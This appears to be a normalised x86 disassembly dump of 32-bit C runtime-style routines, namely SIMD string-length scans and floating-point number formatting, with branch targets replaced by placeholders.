mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub eax ecx
cmp [ eax ] 0x0
je r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc eax
cmp eax edx
jne r-xdata
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax ecx
jmp r-xdata
mov edi eax
add ecx esi
sub edi edx
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
mov edi eax
add ecx esi
sub edi edx
pxor xmm1 xmm1
mov eax edi
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
movaps xmm0 [ ecx ]
pcmpeqb xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
jmp r-xdata
inc ecx
inc ecx
sub_43474c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
test cl 0x1
je r-xdata
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
sub eax ecx
sar eax 0x1
xor edi edi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
sub edx ecx
xor edi edi
add eax 0x2
cmp eax edx
jne r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
mov eax edx
jmp r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
cmp [ eax ] di
je r-xdata
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
lea edx [ ecx + edx * 2 ]
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ edx ] di
je r-xdata
lea edx [ ecx + edx * 2 ]
pxor xmm1 xmm1
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
cmp edx ecx
jne r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
movaps xmm0 [ edx ]
pcmpeqw xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
cmp [ edx ] di
je r-xdata
sub edx eax
jmp r-xdata
add edx 0x2
add edx 0x2
sar edx 0x1
jmp r-xdata
sub_4348fe
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
mov edx [ ebp + 0xc ]
add edx ecx
cmp ecx edx
je r-xdata
sub eax ecx
pop ebp
retn
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp eax edx
jne r-xdata
sub_43491f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
sub eax ecx
sar eax 0x1
pop ebp
retn
cmp [ eax ] 0x0
je r-xdata
add eax 0x2
cmp eax edx
jne r-xdata
sub_434946
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov edx esi
push edi
mov edi [ ebp + 0xc ]
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
cmp edi edx
jae r-xdata
lea ecx [ edx + esi ]
mov eax esi
cmp esi ecx
je r-xdata
mov edx edi
sub eax esi
cmp eax edx
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
sub edi edx
lea ecx [ eax + esi ]
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc eax
cmp eax ecx
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
mov eax ecx
inc ecx
sub_4349c5
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
test cl 0x1
je r-xdata
push esi
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov eax ecx
cmp ecx edx
je r-xdata
mov esi eax
sub eax ecx
sar eax 0x1
jmp r-xdata
xor edi edi
sub eax ecx
sar eax 0x1
cmp eax esi
jne r-xdata
cmp [ eax ] di
je r-xdata
pop edi
pop ebp
retn
add eax 0x2
cmp eax edx
jne r-xdata
pop esi
lea edx [ ecx + eax * 2 ]
mov ecx [ ebp + 0xc ]
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add eax 0x2
cmp eax edx
jne r-xdata
cmp [ eax ] di
je r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
mov eax edx
add edx 0x2
sub_434a80
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov edx esi
push edi
mov edi [ ebp + 0xc ]
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
cmp edi edx
jae r-xdata
lea ecx [ edx + esi ]
mov eax esi
cmp esi ecx
je r-xdata
mov edx edi
sub eax esi
cmp eax edx
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
sub edi edx
lea ecx [ eax + esi ]
mov eax edi
pxor xmm1 xmm1
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc eax
cmp eax ecx
jne r-xdata
cmp ecx edi
jne r-xdata
movaps xmm0 xmm1
pcmpeqb xmm0 [ ecx ]
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
mov eax ecx
inc ecx
sub_434aff
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
test cl 0x1
je r-xdata
push esi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
lea edx [ ecx + eax * 2 ]
mov eax ecx
cmp ecx edx
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov eax ecx
cmp ecx edx
je r-xdata
mov esi eax
sub eax ecx
sar eax 0x1
jmp r-xdata
xor edi edi
sub eax ecx
sar eax 0x1
cmp eax esi
jne r-xdata
cmp [ eax ] di
je r-xdata
pop edi
pop ebp
retn
add eax 0x2
cmp eax edx
jne r-xdata
pop esi
lea edx [ ecx + eax * 2 ]
pxor xmm1 xmm1
mov ecx [ ebp + 0xc ]
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add eax 0x2
cmp eax edx
jne r-xdata
cmp [ eax ] di
je r-xdata
cmp edx ecx
jne r-xdata
movaps xmm0 xmm1
pcmpeqw xmm0 [ edx ]
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
mov eax edx
add edx 0x2
sub_434be6
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
mov edx [ ebp + 0x8 ]
mov ecx edx
mov eax [ ebp + 0xc ]
add eax edx
cmp edx eax
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx edx
cmp [ ecx ] 0x0
je r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ecx
cmp ecx eax
jne r-xdata
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop edi
mov eax ecx
pop esi
pop ebp
retn
mov edi eax
add ecx esi
sub edi edx
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
mov edi eax
add ecx esi
sub edi edx
pxor xmm1 xmm1
mov eax edi
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
movaps xmm0 [ ecx ]
pcmpeqb xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
jmp r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
jmp r-xdata
inc ecx
inc ecx
sub_434d0d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
test cl 0x1
je r-xdata
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
sub edx ecx
xor edi edi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
add edx 0x2
cmp edx eax
jne r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
pop edi
mov eax edx
pop esi
mov esp ebp
pop ebp
retn
lea edx [ ecx + edx * 2 ]
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
lea edx [ ecx + edx * 2 ]
pxor xmm1 xmm1
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
cmp edx ecx
jne r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
movaps xmm0 [ edx ]
pcmpeqw xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
jmp r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
jmp r-xdata
add edx 0x2
add edx 0x2
sar edx 0x1
sub_434ec4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_43b13f
mov [ esi ] eax
sub_434ef1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_437db5
mov [ esi ] eax
sub_434f1e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x7ff
push ebx
push esi
xor edx edx
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
mov eax esi
shr eax 0x14
and eax ecx
push edi
cmp eax ecx
jne r-xdata
xor eax eax
cmp edx edx
jne r-xdata
mov edi esi
mov eax ebx
and edi 0xfffff
or eax edi
jne r-xdata
mov ecx esi
mov eax edx
and ecx 0x80000000
or eax ecx
mov eax 0x80000
je r-xdata
inc eax
jmp r-xdata
and esi eax
or edx esi
je r-xdata
cmp ebx edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x3
jmp r-xdata
push 0x2
jmp r-xdata
cmp edi eax
jne r-xdata
pop eax
jmp r-xdata
push 0x4
sub_434f8a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov ecx [ eax + 0x4 ]
mov eax edx
and ecx 0x80000000
or eax ecx
je r-xdata
mov al dl
pop ebp
retn
inc edx
sub_434fa8
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov edi [ ebp + 0x1c ]
xor ebx ebx
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
push [ ebp + 0x28 ]
mov [ esi ] bl
call sub_41cb44
lea eax [ edi + 0xb ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi ebx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax ecx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_42fef5
push 0x22
pop edi
mov [ eax ] edi
call sub_42fdcf
jmp r-xdata
and ecx 0x80000000
mov eax ebx
or eax ecx
je r-xdata
cmp ebx ebx
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ecx [ edx + 0x4 ]
xor ebx ebx
cmp [ ebp + 0x20 ] bl
push 0x30
sete bl
mov [ ebp - 0xc ] 0x3ff
dec ebx
xor eax eax
and ebx 0xffffffe0
and ecx 0x7ff00000
add ebx 0x27
or eax ecx
mov [ ebp - 0x1c ] ebx
pop eax
jne r-xdata
mov [ esi ] 0x2d
inc esi
push ebx
push [ ebp + 0x24 ]
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push edx
call sub_4352ab
mov edi eax
add esp 0x24
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x30 ]
and [ ecx + 0x350 ] 0xfffffffd
mov [ esi ] 0x31
inc esi
mov [ esi ] al
inc esi
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
or ecx eax
jne r-xdata
push 0x65
push esi
call sub_44cab0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] bl
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x3fe
jmp r-xdata
and [ ebp - 0xc ] ecx
jmp r-xdata
mov edi ebx
jmp r-xdata
cmp [ ebp + 0x20 ] bl
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] bl
and [ ebp - 0x4 ] 0x0
mov ecx 0xf0000
push 0x30
pop eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x10 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0x18 ] ecx
test edi edi
jne r-xdata
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_449940
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_449940
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0x4 ]
shrd eax ecx 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
shr ecx 0x4
sub eax 0x4
dec edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_40de60
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x20 ] 0x0
mov cl 0x34
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
call sub_449940
mov ecx eax
xor ebx ebx
and ecx 0x7ff
sub ecx [ ebp - 0xc ]
sbb ebx ebx
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx 0x0
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp esi edi
jne r-xdata
mov eax 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
test ecx ecx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push 0x0
push 0xa
push ebx
push ecx
call sub_449820
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
push 0x0
push eax
push ebx
push ecx
call sub_449820
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
cmp esi edi
jne r-xdata
cmp ecx eax
jb r-xdata
mov edi esi
push 0x30
pop eax
mov [ esi ] al
test ebx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x30
pop eax
add cl al
xor edi edi
mov [ esi ] cl
mov [ esi + 0x1 ] 0x0
jg r-xdata
push 0x0
push 0x64
push ebx
push ecx
call sub_449820
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_4352ab
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0xc ]
push esi
mov esi [ ebp + 0x1c ]
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
lea edi [ esi + 0x1 ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_442540
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
mov edi [ ebp + 0xc ]
push ecx
xor ecx ecx
cmp [ ebp - 0xc ] 0x2d
sete cl
xor eax eax
test esi esi
setg al
add ecx edi
add eax ecx
push eax
call sub_43fd3a
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
xor eax eax
test esi esi
setg al
sub ecx eax
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push [ ebp + 0x10 ]
push edi
call sub_435346
add esp 0x20
mov [ edi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_435346
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jle r-xdata
xor eax eax
mov eax edi
jmp r-xdata
push ebx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
mov dl [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
test dl dl
je r-xdata
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax [ ebp + 0x1c ]
mov esi ebx
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp + 0x1c ]
xor eax eax
test edi edi
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
push [ ebp + 0xc ]
push ebx
call sub_4357b5
mov dl [ ebp + 0x20 ]
add esp 0x10
test edi edi
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
test dl dl
sete al
add eax edi
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_42cfc7
add esp 0xc
pop ebx
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] al
je r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx + 0x8 ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
cmp [ ebp + 0x18 ] 0x2
jne r-xdata
mov edx [ edx + 0x4 ]
sub edx 0x1
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop edi
cmp edx edi
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_416810
add esp 0xc
push 0xa
pop edi
cmp edx edi
jl r-xdata
mov eax edx
cdq
idiv edi
add [ esi + 0x2 ] al
pop edi
pop esi
mov esp ebp
pop ebp
retn
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv edi
add [ esi + 0x3 ] al
sub_435491
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push esi
push edi
push [ ebp + 0x18 ]
lea edi [ ebp - 0xc ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_442540
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
add eax edi
push eax
xor eax eax
cmp [ ebp - 0xc ] 0x2d
push ecx
sete al
add eax esi
push eax
call sub_43fd3a
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
push [ ebp + 0x20 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x10 ]
push esi
call sub_43551e
add esp 0x18
mov [ esi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_43551e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push edi
push [ ebp + 0x1c ]
call sub_41cb44
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
